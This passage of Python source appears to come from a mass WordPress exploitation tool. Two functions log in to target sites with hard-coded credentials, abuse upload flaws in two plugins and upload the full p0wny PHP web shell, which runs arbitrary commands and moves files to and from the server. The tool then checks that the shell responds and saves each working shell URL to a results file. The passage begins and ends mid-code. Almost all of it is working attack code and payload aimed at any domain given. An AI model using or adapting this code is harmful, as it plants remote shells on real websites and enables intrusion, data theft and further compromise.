            open('results/ShellsExploit.txt', 'a+').write(f"{shell}\n")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}Wp-Exploit #11 -->> {red}Failed Exploit !")
    except:pass
    

def WpEx9(domain):
    try:
        target_ip = domain
        target_port = "80"
        wp_path = "/wordpess/"
        username = "AXVTECH666"
        password = "AXVTECH666PASS@#"
        
        session = requests.Session()
        auth_url = 'http://' + target_ip + ':' + target_port + wp_path + 'wp-login.php'

        # Header:
        header = {
            'Host': target_ip,
            'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'de,en-US;q=0.7,en;q=0.3',
            'Accept-Encoding': 'gzip, deflate',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'http://' + target_ip,
            'Connection': 'close',
            'Upgrade-Insecure-Requests': '1'
        }

        # Body:
        body = {
            'log': username,
            'pwd': password,
            'wp-submit': 'Log In',
            'testcookie': '1'
        }

        # Authenticate:
        auth = session.post(auth_url, headers=header, data=body, timeout=20, verify=False)
        auth_header = auth.headers['Set-Cookie']

        user_id_text = session.get('http://' + target_ip + ':' + target_port + wp_path + 'wp-admin/admin.php?page=sp-client-document-manager-fileview').text
        search_string = "<form><select name='user_uid' id='user_uid' class=''>"
        user_string = ">" + username
        user_id_text = user_id_text[user_id_text.find(search_string):]
        user_id_text = user_id_text[user_id_text.find(user_string) - 2: user_id_text.find(user_string)]
        user_id = user_id_text.replace("'", '')

        exploit_url = "http://" + target_ip + ':' + target_port + wp_path + 'wp-admin/admin.php?page=sp-client-document-manager-fileview&id=' + user_id

        # Header (Exploit):
        Header = {
            "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "de,en-US;q=0.7,en;q=0.3",
            "Accept-Encoding": "gzip, deflate",
            "Referer": exploit_url,
            "Content-Type": "multipart/form-data; boundary=---------------------------37032792112149247252673711332",
            "Origin": "http://" + target_ip,
            "Connection": "close",
            "Upgrade-Insecure-Requests": "1"
        }

        # Web Shell payload (p0wny shell): https://github.com/flozz/p0wny-shell
        shell_payload = "-----------------------------37032792112149247252673711332\r\nContent-Disposition: form-data; name=\"cdm_upload_file_field\"\r\n\r\na1b3bac1bc\r\n-----------------------------37032792112149247252673711332\r\nContent-Disposition: form-data; name=\"_wp_http_referer\"\r\n\r\n/wordpress/wp-admin/admin.php?page=sp-client-document-manager-fileview&id=1\r\n-----------------------------37032792112149247252673711332\r\nContent-Disposition: form-data; name=\"dlg-upload-name\"\r\n\r\nExploits\r\n-----------------------------37032792112149247252673711332\r\nContent-Disposition: form-data; name=\"dlg-upload-file[]\"; filename=\"\"\r\nContent-Type: application/octet-stream\r\n\r\n\r\n-----------------------------37032792112149247252673711332\r\nContent-Disposition: form-data; name=\"dlg-upload-file[]\"; filename=\"shell.pHP\"\r\nContent-Type: application/x-php\r\n\r\n<?php\n\nfunction featureShell($cmd, $cwd) {\n    $stdout = array();\n\n    if (preg_match(\"/^\\s*cd\\s*$/\", $cmd)) {\n        // pass\n    } elseif (preg_match(\"/^\\s*cd\\s+(.+)\\s*(2>&1)?$/\", $cmd)) {\n        chdir($cwd);\n        preg_match(\"/^\\s*cd\\s+([^\\s]+)\\s*(2>&1)?$/\", $cmd, $match);\n        chdir($match[1]);\n    } elseif (preg_match(\"/^\\s*download\\s+[^\\s]+\\s*(2>&1)?$/\", $cmd)) {\n        chdir($cwd);\n        preg_match(\"/^\\s*download\\s+([^\\s]+)\\s*(2>&1)?$/\", $cmd, $match);\n        return featureDownload($match[1]);\n    } else {\n        chdir($cwd);\n        exec($cmd, $stdout);\n    }\n\n    return array(\n        \"stdout\" => $stdout,\n        \"cwd\" => getcwd()\n    );\n}\n\nfunction featurePwd() {\n    return array(\"cwd\" => getcwd());\n}\n\nfunction featureHint($fileName, $cwd, $type) {\n    chdir($cwd);\n    if ($type == 'cmd') {\n        $cmd = \"compgen -c $fileName\";\n    } else {\n        $cmd = \"compgen -f $fileName\";\n    }\n    $cmd = \"/bin/bash -c \\\"$cmd\\\"\";\n    $files = explode(\"\\n\", shell_exec($cmd));\n    return array(\n        'files' => $files,\n    );\n}\n\nfunction featureDownload($filePath) {\n    $file = @file_get_contents($filePath);\n    if ($file === FALSE) {\n        return array(\n            'stdout' => array('File not found / no read permission.'),\n            'cwd' => getcwd()\n        );\n    } else {\n        return array(\n            'name' => basename($filePath),\n            'file' => base64_encode($file)\n        );\n    }\n}\n\nfunction featureUpload($path, $file, $cwd) {\n    chdir($cwd);\n    $f = @fopen($path, 'wb');\n    if ($f === FALSE) {\n        return array(\n            'stdout' => array('Invalid path / no write permission.'),\n            'cwd' => getcwd()\n        );\n    } else {\n        fwrite($f, base64_decode($file));\n        fclose($f);\n        return array(\n            'stdout' => array('Done.'),\n            'cwd' => getcwd()\n        );\n    }\n}\n\nif (isset($_GET[\"feature\"])) {\n\n    $response = NULL;\n\n    switch ($_GET[\"feature\"]) {\n        case \"shell\":\n            $cmd = $_POST['cmd'];\n            if (!preg_match('/2>/', $cmd)) {\n                $cmd .= ' 2>&1';\n            }\n            $response = featureShell($cmd, $_POST[\"cwd\"]);\n            break;\n        case \"pwd\":\n            $response = featurePwd();\n            break;\n        case \"hint\":\n            $response = featureHint($_POST['filename'], $_POST['cwd'], $_POST['type']);\n            break;\n        case 'upload':\n            $response = featureUpload($_POST['path'], $_POST['file'], $_POST['cwd']);\n    }\n\n    header(\"Content-Type: application/json\");\n    echo json_encode($response);\n    die();\n}\n\n?><!DOCTYPE html>\n\n<html>\n\n    <head>\n        <meta charset=\"UTF-8\" />\n        <title>p0wny@shell:~#</title>\n        <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />\n        <style>\n            html, body {\n                margin: 0;\n                padding: 0;\n                background: #333;\n                color: #eee;\n                font-family: monospace;\n            }\n\n            *::-webkit-scrollbar-track {\n                border-radius: 8px;\n                background-color: #353535;\n            }\n\n            *::-webkit-scrollbar {\n                width: 8px;\n                height: 8px;\n            }\n\n            *::-webkit-scrollbar-thumb {\n                border-radius: 8px;\n                -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,.3);\n                background-color: #bcbcbc;\n            }\n\n            #shell {\n                background: #222;\n                max-width: 800px;\n                margin: 50px auto 0 auto;\n                box-shadow: 0 0 5px rgba(0, 0, 0, .3);\n                font-size: 10pt;\n                display: flex;\n                flex-direction: column;\n                align-items: stretch;\n            }\n\n            #shell-content {\n                height: 500px;\n                overflow: auto;\n                padding: 5px;\n                white-space: pre-wrap;\n                flex-grow: 1;\n            }\n\n            #shell-logo {\n                font-weight: bold;\n                color: #FF4180;\n                text-align: center;\n            }\n\n            @media (max-width: 991px) {\n                #shell-logo {\n                    font-size: 6px;\n                    margin: -25px 0;\n                }\n\n                html, body, #shell {\n                    height: 100%;\n                    width: 100%;\n                    max-width: none;\n                }\n\n                #shell {\n                    margin-top: 0;\n                }\n            }\n\n            @media (max-width: 767px) {\n                #shell-input {\n                    flex-direction: column;\n                }\n            }\n\n            @media (max-width: 320px) {\n                #shell-logo {\n                    font-size: 5px;\n                }\n            }\n\n            .shell-prompt {\n                font-weight: bold;\n                color: #75DF0B;\n            }\n\n            .shell-prompt > span {\n                color: #1BC9E7;\n            }\n\n            #shell-input {\n                display: flex;\n                box-shadow: 0 -1px 0 rgba(0, 0, 0, .3);\n                border-top: rgba(255, 255, 255, .05) solid 1px;\n            }\n\n            #shell-input > label {\n                flex-grow: 0;\n                display: block;\n                padding: 0 5px;\n                height: 30px;\n                line-height: 30px;\n            }\n\n            #shell-input #shell-cmd {\n                height: 30px;\n                line-height: 30px;\n                border: none;\n                background: transparent;\n                color: #eee;\n                font-family: monospace;\n                font-size: 10pt;\n                width: 100%;\n                align-self: center;\n            }\n\n            #shell-input div {\n                flex-grow: 1;\n                align-items: stretch;\n            }\n\n            #shell-input input {\n                outline: none;\n            }\n        </style>\n\n        <script>\n            var CWD = null;\n            var commandHistory = [];\n            var historyPosition = 0;\n            var eShellCmdInput = null;\n            var eShellContent = null;\n\n            function _insertCommand(command) {\n                eShellContent.innerHTML += \"\\n\\n\";\n                eShellContent.innerHTML += '<span class=\\\"shell-prompt\\\">' + genPrompt(CWD) + '</span> ';\n                eShellContent.innerHTML += escapeHtml(command);\n                eShellContent.innerHTML += \"\\n\";\n                eShellContent.scrollTop = eShellContent.scrollHeight;\n            }\n\n            function _insertStdout(stdout) {\n                eShellContent.innerHTML += escapeHtml(stdout);\n                eShellContent.scrollTop = eShellContent.scrollHeight;\n            }\n\n            function _defer(callback) {\n                setTimeout(callback, 0);\n            }\n\n            function featureShell(command) {\n\n                _insertCommand(command);\n                if (/^\\s*upload\\s+[^\\s]+\\s*$/.test(command)) {\n                    featureUpload(command.match(/^\\s*upload\\s+([^\\s]+)\\s*$/)[1]);\n                } else if (/^\\s*clear\\s*$/.test(command)) {\n                    // Backend shell TERM environment variable not set. Clear command history from UI but keep in buffer\n                    eShellContent.innerHTML = '';\n                } else {\n                    makeRequest(\"?feature=shell\", {cmd: command, cwd: CWD}, function (response) {\n                        if (response.hasOwnProperty('file')) {\n                            featureDownload(response.name, response.file)\n                        } else {\n                            _insertStdout(response.stdout.join(\"\\n\"));\n                            updateCwd(response.cwd);\n                        }\n                    });\n                }\n            }\n\n            function featureHint() {\n                if (eShellCmdInput.value.trim().length === 0) return;  // field is empty -> nothing to complete\n\n                function _requestCallback(data) {\n                    if (data.files.length <= 1) return;  // no completion\n\n                    if (data.files.length === 2) {\n                        if (type === 'cmd') {\n                            eShellCmdInput.value = data.files[0];\n                        } else {\n                            var currentValue = eShellCmdInput.value;\n                            eShellCmdInput.value = currentValue.replace(/([^\\s]*)$/, data.files[0]);\n                        }\n                    } else {\n                        _insertCommand(eShellCmdInput.value);\n                        _insertStdout(data.files.join(\"\\n\"));\n                    }\n                }\n\n                var currentCmd = eShellCmdInput.value.split(\" \");\n                var type = (currentCmd.length === 1) ? \"cmd\" : \"file\";\n                var fileName = (type === \"cmd\") ? currentCmd[0] : currentCmd[currentCmd.length - 1];\n\n                makeRequest(\n                    \"?feature=hint\",\n                    {\n                        filename: fileName,\n                        cwd: CWD,\n                        type: type\n                    },\n                    _requestCallback\n                );\n\n            }\n\n            function featureDownload(name, file) {\n                var element = document.createElement('a');\n                element.setAttribute('href', 'data:application/octet-stream;base64,' + file);\n                element.setAttribute('download', name);\n                element.style.display = 'none';\n                document.body.appendChild(element);\n                element.click();\n                document.body.removeChild(element);\n                _insertStdout('Done.');\n            }\n\n            function featureUpload(path) {\n                var element = document.createElement('input');\n                element.setAttribute('type', 'file');\n                element.style.display = 'none';\n                document.body.appendChild(element);\n                element.addEventListener('change', function () {\n                    var promise = getBase64(element.files[0]);\n                    promise.then(function (file) {\n                        makeRequest('?feature=upload', {path: path, file: file, cwd: CWD}, function (response) {\n                            _insertStdout(response.stdout.join(\"\\n\"));\n                            updateCwd(response.cwd);\n                        });\n                    }, function () {\n                        _insertStdout('An unknown client-side error occurred.');\n                    });\n                });\n                element.click();\n                document.body.removeChild(element);\n            }\n\n            function getBase64(file, onLoadCallback) {\n                return new Promise(function(resolve, reject) {\n                    var reader = new FileReader();\n                    reader.onload = function() { resolve(reader.result.match(/base64,(.*)$/)[1]); };\n                    reader.onerror = reject;\n                    reader.readAsDataURL(file);\n                });\n            }\n\n            function genPrompt(cwd) {\n                cwd = cwd || \"~\";\n                var shortCwd = cwd;\n                if (cwd.split(\"/\").length > 3) {\n                    var splittedCwd = cwd.split(\"/\");\n                    shortCwd = \"\xe2\x80\xa6/\" + splittedCwd[splittedCwd.length-2] + \"/\" + splittedCwd[splittedCwd.length-1];\n                }\n                return \"p0wny@shell:<span title=\\\"\" + cwd + \"\\\">\" + shortCwd + \"</span>#\";\n            }\n\n            function updateCwd(cwd) {\n                if (cwd) {\n                    CWD = cwd;\n                    _updatePrompt();\n                    return;\n                }\n                makeRequest(\"?feature=pwd\", {}, function(response) {\n                    CWD = response.cwd;\n                    _updatePrompt();\n                });\n\n            }\n\n            function escapeHtml(string) {\n                return string\n                    .replace(/&/g, \"&amp;\")\n                    .replace(/</g, \"&lt;\")\n                    .replace(/>/g, \"&gt;\");\n            }\n\n            function _updatePrompt() {\n                var eShellPrompt = document.getElementById(\"shell-prompt\");\n                eShellPrompt.innerHTML = genPrompt(CWD);\n            }\n\n            function _onShellCmdKeyDown(event) {\n                switch (event.key) {\n                    case \"Enter\":\n                        featureShell(eShellCmdInput.value);\n                        insertToHistory(eShellCmdInput.value);\n                        eShellCmdInput.value = \"\";\n                        break;\n                    case \"ArrowUp\":\n                        if (historyPosition > 0) {\n                            historyPosition--;\n                            eShellCmdInput.blur();\n                            eShellCmdInput.value = commandHistory[historyPosition];\n                            _defer(function() {\n                                eShellCmdInput.focus();\n                            });\n                        }\n                        break;\n                    case \"ArrowDown\":\n                        if (historyPosition >= commandHistory.length) {\n                            break;\n                        }\n                        historyPosition++;\n                        if (historyPosition === commandHistory.length) {\n                            eShellCmdInput.value = \"\";\n                        } else {\n                            eShellCmdInput.blur();\n                            eShellCmdInput.focus();\n                            eShellCmdInput.value = commandHistory[historyPosition];\n                        }\n                        break;\n                    case 'Tab':\n                        event.preventDefault();\n                        featureHint();\n                        break;\n                }\n            }\n\n            function insertToHistory(cmd) {\n                commandHistory.push(cmd);\n                historyPosition = commandHistory.length;\n            }\n\n            function makeRequest(url, params, callback) {\n                function getQueryString() {\n                    var a = [];\n                    for (var key in params) {\n                        if (params.hasOwnProperty(key)) {\n                            a.push(encodeURIComponent(key) + \"=\" + encodeURIComponent(params[key]));\n                        }\n                    }\n                    return a.join(\"&\");\n                }\n                var xhr = new XMLHttpRequest();\n                xhr.open(\"POST\", url, true);\n                xhr.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\");\n                xhr.onreadystatechange = function() {\n                    if (xhr.readyState === 4 && xhr.status === 200) {\n                        try {\n                            var responseJson = JSON.parse(xhr.responseText);\n                            callback(responseJson);\n                        } catch (error) {\n                            alert(\"Error while parsing response: \" + error);\n                        }\n                    }\n                };\n                xhr.send(getQueryString());\n            }\n\n            document.onclick = function(event) {\n                event = event || window.event;\n                var selection = window.getSelection();\n                var target = event.target || event.srcElement;\n\n                if (target.tagName === \"SELECT\") {\n                    return;\n                }\n\n                if (!selection.toString()) {\n                    eShellCmdInput.focus();\n                }\n            };\n\n            window.onload = function() {\n                eShellCmdInput = document.getElementById(\"shell-cmd\");\n                eShellContent = document.getElementById(\"shell-content\");\n                updateCwd();\n                eShellCmdInput.focus();\n            };\n        </script>\n    </head>\n\n    <body>\n        <div id=\"shell\">\n            <pre id=\"shell-content\">\n                <div id=\"shell-logo\">\n        ___                         ____      _          _ _        _  _   <span></span>\n _ __  / _ \\__      ___ __  _   _  / __ \\ ___| |__   ___| | |_ /\\/|| || |_ <span></span>\n| '_ \\| | | \\ \\ /\\ / / '_ \\| | | |/ / _` / __| '_ \\ / _ \\ | (_)/\\/_  ..  _|<span></span>\n| |_) | |_| |\\ V  V /| | | | |_| | | (_| \\__ \\ | | |  __/ | |_   |_      _|<span></span>\n| .__/ \\___/  \\_/\\_/ |_| |_|\\__, |\\ \\__,_|___/_| |_|\\___|_|_(_)    |_||_|  <span></span>\n|_|                         |___/  \\____/                                  <span></span>\n                </div>\n            </pre>\n            <div id=\"shell-input\">\n                <label for=\"shell-cmd\" id=\"shell-prompt\" class=\"shell-prompt\">???</label>\n                <div>\n                    <input id=\"shell-cmd\" name=\"cmd\" onkeydown=\"_onShellCmdKeyDown(event)\"/>\n                </div>\n            </div>\n        </div>\n    </body>\n\n</html>\n\r\n-----------------------------37032792112149247252673711332\r\nContent-Disposition: form-data; name=\"dlg-upload-notes\"\r\n\r\n\r\n-----------------------------37032792112149247252673711332\r\nContent-Disposition: form-data; name=\"sp-cdm-community-upload\"\r\n\r\nUpload\r\n-----------------------------37032792112149247252673711332--\r\n"

        # Exploit:
        session.post(exploit_url, headers=Header, data=shell_payload, verify=False, timeout=10)
        shell = 'http://' + target_ip + ':' + target_port + wp_path + 'wp-content/uploads/sp-client-document-manager/' + user_id + '/shell.php'
        check = requests.get(shell, headers=ua, timeout=10, verify=False).text
        if "<title>p0wny@shell:~#" in check:
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}Wp-Exploit #9 -->> {green}Exploited !")
            open('results/ShellsExploit.txt', 'a+').write(f"{shell}\n")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}Wp-Exploit #9 -->> {red}Failed Exploit !")
    except:pass

def WpEx10(domain):
    try:
        target_ip = domain
        target_port = "80"
        wp_path = "/wordpress/"
        username = "axvtech666"
        password = "axvtech666pass@#"

        session = requests.Session()
        auth_url = 'http://' + target_ip + ':' + target_port + wp_path + 'wp-login.php'
        check = session.get(auth_url)
        # Header:
        header = {
            'Host': target_ip,
            'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'de,en-US;q=0.7,en;q=0.3',
            'Accept-Encoding': 'gzip, deflate',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'http://' + target_ip,
            'Connection': 'close',
            'Upgrade-Insecure-Requests': '1'
        }

        # Body:
        body = {
            'log': username,
            'pwd': password,
            'wp-submit': 'Log In',
            'testcookie': '1'
        }
        auth = session.post(auth_url, headers=header, data=body, timeout=20, verify=False)

        # Get Security nonce value:
        check = session.get('http://' + target_ip + ':' + target_port + wp_path+ 'wp-admin/themes.php?page=catch-themes-demo-import', verify=False, headers=ua, timeout=10).text
        nonce = check[check.find('ajax_nonce"') + 13:]
        wp_nonce = nonce[:nonce.find('"')]

        exploit_url = 'http://' + target_ip + ':' + target_port + wp_path + 'wp-admin/admin-ajax.php'

        # Header (Exploit):
        header = {
            "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/94.0",
            "Accept": "*/*",
            "Accept-Language": "de,en-US;q=0.7,en;q=0.3",
            "Accept-Encoding": "gzip, deflate",
            'Referer': 'http://' + target_ip + '/wordpress/wp-admin/themes.php?page=catch-themes-demo-import',
            "X-Requested-With": "XMLHttpRequest",
            "Content-Type": "multipart/form-data; boundary=---------------------------121585879226594965303252407916",
            "Origin": "http://" + target_ip,
            "Connection": "close"
        }

        # Exploit Payload (Using p0wny shell: https://github.com/flozz/p0wny-shell):
        shell_payload = "-----------------------------121585879226594965303252407916\r\nContent-Disposition: form-data; name=\"action\"\r\n\r\nctdi_import_demo_data\r\n-----------------------------121585879226594965303252407916\r\nContent-Disposition: form-data; name=\"security\"\r\n\r\n" + wp_nonce + "\r\n-----------------------------121585879226594965303252407916\r\nContent-Disposition: form-data; name=\"selected\"\r\n\r\nundefined\r\n-----------------------------121585879226594965303252407916\r\nContent-Disposition: form-data; name=\"content_file\"; filename=\"shell.php\"\r\nContent-Type: application/x-php\r\n\r\n<?php\n\nfunction featureShell($cmd, $cwd) {\n    $stdout = array();\n\n    if (preg_match(\"/^\\s*cd\\s*$/\", $cmd)) {\n        // pass\n    } elseif (preg_match(\"/^\\s*cd\\s+(.+)\\s*(2>&1)?$/\", $cmd)) {\n        chdir($cwd);\n        preg_match(\"/^\\s*cd\\s+([^\\s]+)\\s*(2>&1)?$/\", $cmd, $match);\n        chdir($match[1]);\n    } elseif (preg_match(\"/^\\s*download\\s+[^\\s]+\\s*(2>&1)?$/\", $cmd)) {\n        chdir($cwd);\n        preg_match(\"/^\\s*download\\s+([^\\s]+)\\s*(2>&1)?$/\", $cmd, $match);\n        return featureDownload($match[1]);\n    } else {\n        chdir($cwd);\n        exec($cmd, $stdout);\n    }\n\n    return array(\n        \"stdout\" => $stdout,\n        \"cwd\" => getcwd()\n    );\n}\n\nfunction featurePwd() {\n    return array(\"cwd\" => getcwd());\n}\n\nfunction featureHint($fileName, $cwd, $type) {\n    chdir($cwd);\n    if ($type == 'cmd') {\n        $cmd = \"compgen -c $fileName\";\n    } else {\n        $cmd = \"compgen -f $fileName\";\n    }\n    $cmd = \"/bin/bash -c \\\"$cmd\\\"\";\n    $files = explode(\"\\n\", shell_exec($cmd));\n    return array(\n        'files' => $files,\n    );\n}\n\nfunction featureDownload($filePath) {\n    $file = @file_get_contents($filePath);\n    if ($file === FALSE) {\n        return array(\n            'stdout' => array('File not found / no read permission.'),\n            'cwd' => getcwd()\n        );\n    } else {\n        return array(\n            'name' => basename($filePath),\n            'file' => base64_encode($file)\n        );\n    }\n}\n\nfunction featureUpload($path, $file, $cwd) {\n    chdir($cwd);\n    $f = @fopen($path, 'wb');\n    if ($f === FALSE) {\n        return array(\n            'stdout' => array('Invalid path / no write permission.'),\n            'cwd' => getcwd()\n        );\n    } else {\n        fwrite($f, base64_decode($file));\n        fclose($f);\n        return array(\n            'stdout' => array('Done.'),\n            'cwd' => getcwd()\n        );\n    }\n}\n\nif (isset($_GET[\"feature\"])) {\n\n    $response = NULL;\n\n    switch ($_GET[\"feature\"]) {\n        case \"shell\":\n            $cmd = $_POST['cmd'];\n            if (!preg_match('/2>/', $cmd)) {\n                $cmd .= ' 2>&1';\n            }\n            $response = featureShell($cmd, $_POST[\"cwd\"]);\n            break;\n        case \"pwd\":\n            $response = featurePwd();\n            break;\n        case \"hint\":\n            $response = featureHint($_POST['filename'], $_POST['cwd'], $_POST['type']);\n            break;\n        case 'upload':\n            $response = featureUpload($_POST['path'], $_POST['file'], $_POST['cwd']);\n    }\n\n    header(\"Content-Type: application/json\");\n    echo json_encode($response);\n    die();\n}\n\n?><!DOCTYPE html>\n\n<html>\n\n    <head>\n        <meta charset=\"UTF-8\" />\n        <title>p0wny@shell:~#</title>\n        <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />\n        <style>\n            html, body {\n                margin: 0;\n                padding: 0;\n                background: #333;\n                color: #eee;\n                font-family: monospace;\n            }\n\n            *::-webkit-scrollbar-track {\n                border-radius: 8px;\n                background-color: #353535;\n            }\n\n            *::-webkit-scrollbar {\n                width: 8px;\n                height: 8px;\n            }\n\n            *::-webkit-scrollbar-thumb {\n                border-radius: 8px;\n                -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,.3);\n                background-color: #bcbcbc;\n            }\n\n            #shell {\n                background: #222;\n                max-width: 800px;\n                margin: 50px auto 0 auto;\n                box-shadow: 0 0 5px rgba(0, 0, 0, .3);\n                font-size: 10pt;\n                display: flex;\n                flex-direction: column;\n                align-items: stretch;\n            }\n\n            #shell-content {\n                height: 500px;\n                overflow: auto;\n                padding: 5px;\n                white-space: pre-wrap;\n                flex-grow: 1;\n            }\n\n            #shell-logo {\n                font-weight: bold;\n                color: #FF4180;\n                text-align: center;\n            }\n\n            @media (max-width: 991px) {\n                #shell-logo {\n                    font-size: 6px;\n                    margin: -25px 0;\n                }\n\n                html, body, #shell {\n                    height: 100%;\n                    width: 100%;\n                    max-width: none;\n                }\n\n                #shell {\n                    margin-top: 0;\n                }\n            }\n\n            @media (max-width: 767px) {\n                #shell-input {\n                    flex-direction: column;\n                }\n            }\n\n            @media (max-width: 320px) {\n                #shell-logo {\n                    font-size: 5px;\n                }\n            }\n\n            .shell-prompt {\n                font-weight: bold;\n                color: #75DF0B;\n            }\n\n            .shell-prompt > span {\n                color: #1BC9E7;\n            }\n\n            #shell-input {\n                display: flex;\n                box-shadow: 0 -1px 0 rgba(0, 0, 0, .3);\n                border-top: rgba(255, 255, 255, .05) solid 1px;\n            }\n\n            #shell-input > label {\n                flex-grow: 0;\n                display: block;\n                padding: 0 5px;\n                height: 30px;\n                line-height: 30px;\n            }\n\n            #shell-input #shell-cmd {\n                height: 30px;\n                line-height: 30px;\n                border: none;\n                background: transparent;\n                color: #eee;\n                font-family: monospace;\n                font-size: 10pt;\n                width: 100%;\n                align-self: center;\n            }\n\n            #shell-input div {\n                flex-grow: 1;\n                align-items: stretch;\n            }\n\n            #shell-input input {\n                outline: none;\n            }\n        </style>\n\n        <script>\n            var CWD = null;\n            var commandHistory = [];\n            var historyPosition = 0;\n            var eShellCmdInput = null;\n            var eShellContent = null;\n\n            function _insertCommand(command) {\n                eShellContent.innerHTML += \"\\n\\n\";\n                eShellContent.innerHTML += '<span class=\\\"shell-prompt\\\">' + genPrompt(CWD) + '</span> ';\n                eShellContent.innerHTML += escapeHtml(command);\n                eShellContent.innerHTML += \"\\n\";\n                eShellContent.scrollTop = eShellContent.scrollHeight;\n            }\n\n            function _insertStdout(stdout) {\n                eShellContent.innerHTML += escapeHtml(stdout);\n                eShellContent.scrollTop = eShellContent.scrollHeight;\n            }\n\n            function _defer(callback) {\n                setTimeout(callback, 0);\n            }\n\n            function featureShell(command) {\n\n                _insertCommand(command);\n                if (/^\\s*upload\\s+[^\\s]+\\s*$/.test(command)) {\n                    featureUpload(command.match(/^\\s*upload\\s+([^\\s]+)\\s*$/)[1]);\n                } else if (/^\\s*clear\\s*$/.test(command)) {\n                    // Backend shell TERM environment variable not set. Clear command history from UI but keep in buffer\n                    eShellContent.innerHTML = '';\n                } else {\n                    makeRequest(\"?feature=shell\", {cmd: command, cwd: CWD}, function (response) {\n                        if (response.hasOwnProperty('file')) {\n                            featureDownload(response.name, response.file)\n                        } else {\n                            _insertStdout(response.stdout.join(\"\\n\"));\n                            updateCwd(response.cwd);\n                        }\n                    });\n                }\n            }\n\n            function featureHint() {\n                if (eShellCmdInput.value.trim().length === 0) return;  // field is empty -> nothing to complete\n\n                function _requestCallback(data) {\n                    if (data.files.length <= 1) return;  // no completion\n\n                    if (data.files.length === 2) {\n                        if (type === 'cmd') {\n                            eShellCmdInput.value = data.files[0];\n                        } else {\n                            var currentValue = eShellCmdInput.value;\n                            eShellCmdInput.value = currentValue.replace(/([^\\s]*)$/, data.files[0]);\n                        }\n                    } else {\n                        _insertCommand(eShellCmdInput.value);\n                        _insertStdout(data.files.join(\"\\n\"));\n                    }\n                }\n\n                var currentCmd = eShellCmdInput.value.split(\" \");\n                var type = (currentCmd.length === 1) ? \"cmd\" : \"file\";\n                var fileName = (type === \"cmd\") ? currentCmd[0] : currentCmd[currentCmd.length - 1];\n\n                makeRequest(\n                    \"?feature=hint\",\n                    {\n                        filename: fileName,\n                        cwd: CWD,\n                        type: type\n                    },\n                    _requestCallback\n                );\n\n            }\n\n            function featureDownload(name, file) {\n                var element = document.createElement('a');\n                element.setAttribute('href', 'data:application/octet-stream;base64,' + file);\n                element.setAttribute('download', name);\n                element.style.display = 'none';\n                document.body.appendChild(element);\n                element.click();\n                document.body.removeChild(element);\n                _insertStdout('Done.');\n            }\n\n            function featureUpload(path) {\n                var element = document.createElement('input');\n                element.setAttribute('type', 'file');\n                element.style.display = 'none';\n                document.body.appendChild(element);\n                element.addEventListener('change', function () {\n                    var promise = getBase64(element.files[0]);\n                    promise.then(function (file) {\n                        makeRequest('?feature=upload', {path: path, file: file, cwd: CWD}, function (response) {\n                            _insertStdout(response.stdout.join(\"\\n\"));\n                            updateCwd(response.cwd);\n                        });\n                    }, function () {\n                        _insertStdout('An unknown client-side error occurred.');\n                    });\n                });\n                element.click();\n                document.body.removeChild(element);\n            }\n\n            function getBase64(file, onLoadCallback) {\n                return new Promise(function(resolve, reject) {\n                    var reader = new FileReader();\n                    reader.onload = function() { resolve(reader.result.match(/base64,(.*)$/)[1]); };\n                    reader.onerror = reject;\n                    reader.readAsDataURL(file);\n                });\n            }\n\n            function genPrompt(cwd) {\n                cwd = cwd || \"~\";\n                var shortCwd = cwd;\n                if (cwd.split(\"/\").length > 3) {\n                    var splittedCwd = cwd.split(\"/\");\n                    shortCwd = \"\xe2\x80\xa6/\" + splittedCwd[splittedCwd.length-2] + \"/\" + splittedCwd[splittedCwd.length-1];\n                }\n                return \"p0wny@shell:<span title=\\\"\" + cwd + \"\\\">\" + shortCwd + \"</span>#\";\n            }\n\n            function updateCwd(cwd) {\n                if (cwd) {\n                    CWD = cwd;\n                    _updatePrompt();\n                    return;\n                }\n                makeRequest(\"?feature=pwd\", {}, function(response) {\n                    CWD = response.cwd;\n                    _updatePrompt();\n                });\n\n            }\n\n            function escapeHtml(string) {\n                return string\n                    .replace(/&/g, \"&amp;\")\n                    .replace(/</g, \"&lt;\")\n                    .replace(/>/g, \"&gt;\");\n            }\n\n            function _updatePrompt() {\n                var eShellPrompt = document.getElementById(\"shell-prompt\");\n                eShellPrompt.innerHTML = genPrompt(CWD);\n            }\n\n            function _onShellCmdKeyDown(event) {\n                switch (event.key) {\n                    case \"Enter\":\n                        featureShell(eShellCmdInput.value);\n                        insertToHistory(eShellCmdInput.value);\n                        eShellCmdInput.value = \"\";\n                        break;\n                    case \"ArrowUp\":\n                        if (historyPosition > 0) {\n                            historyPosition--;\n                            eShellCmdInput.blur();\n                            eShellCmdInput.value = commandHistory[historyPosition];\n                            _defer(function() {\n                                eShellCmdInput.focus();\n                            });\n                        }\n                        break;\n                    case \"ArrowDown\":\n                        if (historyPosition >= commandHistory.length) {\n                            break;\n                        }\n                        historyPosition++;\n                        if (historyPosition === commandHistory.length) {\n                            eShellCmdInput.value = \"\";\n                        } else {\n                            eShellCmdInput.blur();\n                            eShellCmdInput.focus();\n                            eShellCmdInput.value = commandHistory[historyPosition];\n                        }\n                        break;\n                    case 'Tab':\n                        event.preventDefault();\n                        featureHint();\n                        break;\n                }\n            }\n\n            function insertToHistory(cmd) {\n                commandHistory.push(cmd);\n                